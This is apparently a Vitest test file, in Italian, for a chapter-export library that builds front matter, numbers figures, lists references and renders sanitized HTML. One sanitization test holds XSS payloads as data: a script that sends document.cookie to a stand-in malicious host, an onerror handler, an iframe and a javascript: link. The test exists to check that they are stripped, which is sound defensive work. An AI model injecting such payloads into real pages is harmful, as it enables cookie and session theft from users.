import { describe, expect, it } from 'vitest';
import {
  buildFrontMatter,
  buildReferencesSection,
  exportMarkdown,
  numberFiguresInMarkdown,
  type ExportMeta,
} from '@/lib/publish/markdown';
import { exportHtml } from '@/lib/publish/html';

const META: ExportMeta = {
  title: 'Incremental Tables',
  chapterNumber: 11,
  chapterLabel: 'Capitolo 11',
  author: 'Daniel Meloni',
  projectTitle: 'Dataform in Pratica',
  volume: 'Volume 1',
  versionNo: 3,
  exportedAt: '2026-08-09T12:00:00.000Z',
};

const CONTENUTO = `# Incremental Tables

Le tabelle incrementali elaborano solo le righe nuove.

## Esempio

\`\`\`sqlx
config { type: "incremental" }
select 1
\`\`\`

![Schema del flusso](assets/figura-a.png)

![](assets/figura-b.png)

Vedi la [documentazione](https://cloud.google.com/dataform/docs).
`;

describe('front matter', () => {
  it('include i metadati dell’opera', () => {
    const fm = buildFrontMatter(META);
    expect(fm.startsWith('---')).toBe(true);
    expect(fm).toContain('title: Incremental Tables');
    expect(fm).toContain('author: Daniel Meloni');
    expect(fm).toContain('versione: 3');
  });

  it('quota i valori che conterrebbero YAML non valido', () => {
    const fm = buildFrontMatter({ ...META, title: 'Titolo: con due punti' });
    expect(fm).toContain('title: "Titolo: con due punti"');
  });

  it('omette i campi non valorizzati', () => {
    const fm = buildFrontMatter({ ...META, volume: null, chapterLabel: null });
    expect(fm).not.toContain('volume:');
    expect(fm).not.toContain('capitolo:');
  });
});

describe('numerazione delle figure', () => {
  it('numera in modo progressivo con il prefisso del capitolo', () => {
    const esito = numberFiguresInMarkdown(CONTENUTO, 11);
    expect(esito.count).toBe(2);
    expect(esito.markdown).toContain('Figura 11.1 — Schema del flusso');
    expect(esito.markdown).toContain('![Figura 11.2 —');
  });

  it('non duplica un’etichetta già presente', () => {
    const esito = numberFiguresInMarkdown('![Figura 11.1 — Già numerata](a.png)', 11);
    expect(esito.markdown).toContain('![Figura 11.1 — Già numerata]');
    expect(esito.markdown).not.toContain('Figura 11.1 — Figura');
  });

  it('senza numero di capitolo numera in modo semplice', () => {
    const esito = numberFiguresInMarkdown('![Prima](a.png)', null);
    expect(esito.markdown).toContain('Figura 1 — Prima');
  });

  it('conserva il titolo dell’immagine quando presente', () => {
    const esito = numberFiguresInMarkdown('![Alt](a.png "Titolo")', 2);
    expect(esito.markdown).toContain('(a.png "Titolo")');
  });
});

describe('sezione dei riferimenti', () => {
  it('mette per prime le fonti ufficiali', () => {
    const sezione = buildReferencesSection([
      { url: 'https://medium.com/x', title: 'Un articolo', publisher: 'Medium', isOfficial: false },
      { url: 'https://cloud.google.com/y', title: 'Documentazione', publisher: 'Google', isOfficial: true },
    ]);

    const posizioneUfficiale = sezione.indexOf('Documentazione');
    const posizioneAltra = sezione.indexOf('Un articolo');
    expect(posizioneUfficiale).toBeLessThan(posizioneAltra);
    expect(sezione).toContain('*(documentazione ufficiale)*');
  });

  it('non produce nulla senza citazioni', () => {
    expect(buildReferencesSection([])).toBe('');
  });
});

describe('esportazione Markdown', () => {
  const esito = exportMarkdown(CONTENUTO, META, {
    citations: [
      { url: 'https://cloud.google.com/dataform/docs', title: 'Documentazione Dataform', publisher: 'Google', isOfficial: true },
    ],
  });

  it('compone front matter, corpo e riferimenti', () => {
    expect(esito.content.startsWith('---')).toBe(true);
    expect(esito.content).toContain('# Incremental Tables');
    expect(esito.content).toContain('## Riferimenti');
  });

  it('conserva il testo originale parola per parola', () => {
    expect(esito.content).toContain('Le tabelle incrementali elaborano solo le righe nuove.');
    expect(esito.content).toContain('config { type: "incremental" }');
  });

  it('riporta statistiche coerenti', () => {
    expect(esito.stats.figures).toBe(2);
    expect(esito.stats.codeBlocks).toBe(1);
    expect(esito.stats.citations).toBe(1);
    expect(esito.stats.words).toBeGreaterThan(10);
  });

  it('può omettere il front matter', () => {
    const senza = exportMarkdown(CONTENUTO, META, { includeFrontMatter: false });
    expect(senza.content.startsWith('---')).toBe(false);
  });
});

describe('esportazione HTML', () => {
  it('produce un documento semantico completo', async () => {
    const esito = await exportHtml(CONTENUTO, META);

    expect(esito.html.startsWith('<!doctype html>')).toBe(true);
    expect(esito.html).toContain('<html lang="it">');
    expect(esito.html).toContain('<article lang="it">');
    expect(esito.html).toContain('<header>');
    expect(esito.html).toContain('<h1>Incremental Tables</h1>');
  });

  it('assegna un id a ogni titolo', async () => {
    const esito = await exportHtml(CONTENUTO, META);
    expect(esito.fragment).toContain('id="incremental-tables"');
    expect(esito.fragment).toContain('id="esempio"');
  });

  it('trasforma le immagini con didascalia in figure', async () => {
    const esito = await exportHtml(CONTENUTO, META);
    expect(esito.fragment).toContain('<figure>');
    expect(esito.fragment).toContain('<figcaption>Schema del flusso</figcaption>');
  });

  it('conserva il linguaggio dei blocchi di codice', async () => {
    const esito = await exportHtml(CONTENUTO, META);
    expect(esito.fragment).toContain('language-sqlx');
  });

  /**
   * Il Markdown proviene da un archivio caricato: può contenere qualsiasi cosa.
   * Senza sanitizzazione, un manuale ostile eseguirebbe codice nel browser di
   * chi ne apre l'anteprima.
   */
  it('rimuove HTML pericoloso incorporato nel Markdown', async () => {
    const ostile = [
      '# Titolo',
      '<script>fetch("https://esempio-malevolo.test?c="+document.cookie)</script>',
      '<img src=x onerror="alert(1)">',
      '<iframe src="https://esempio-malevolo.test"></iframe>',
      '<a href="javascript:alert(1)">clic</a>',
      '<style>body{display:none}</style>',
    ].join('\n\n');

    const esito = await exportHtml(ostile, META);

    expect(esito.fragment).not.toContain('<script');
    expect(esito.fragment).not.toContain('onerror');
    expect(esito.fragment).not.toContain('<iframe');
    expect(esito.fragment).not.toContain('javascript:');
    expect(esito.fragment).not.toContain('<style');
  });

  it('neutralizza i metadati che contengono HTML', async () => {
    const esito = await exportHtml('# Ciao', { ...META, title: '<script>alert(1)</script>' });
    expect(esito.html).not.toContain('<script>alert');
    expect(esito.html).toContain('&lt;script&gt;');
  });

  it('rende le tabelle GitHub', async () => {
    const esito = await exportHtml('| A | B |\n|---|---|\n| 1 | 2 |', META);
    expect(esito.fragment).toContain('<table>');
    expect(esito.fragment).toContain('<th>A</th>');
  });

  it('elenca i riferimenti in un footer', async () => {
    const esito = await exportHtml(CONTENUTO, META, {
      citations: [{ url: 'https://cloud.google.com/x', title: 'Doc', publisher: null, isOfficial: true }],
    });
    expect(esito.fragment).toContain('<footer>');
    expect(esito.fragment).toContain('rel="noopener noreferrer"');
  });

  it('può restituire il solo frammento', async () => {
    const esito = await exportHtml('# T', META, { standalone: false });
    expect(esito.html).toBe(esito.fragment);
    expect(esito.html.startsWith('<article')).toBe(true);
  });
});
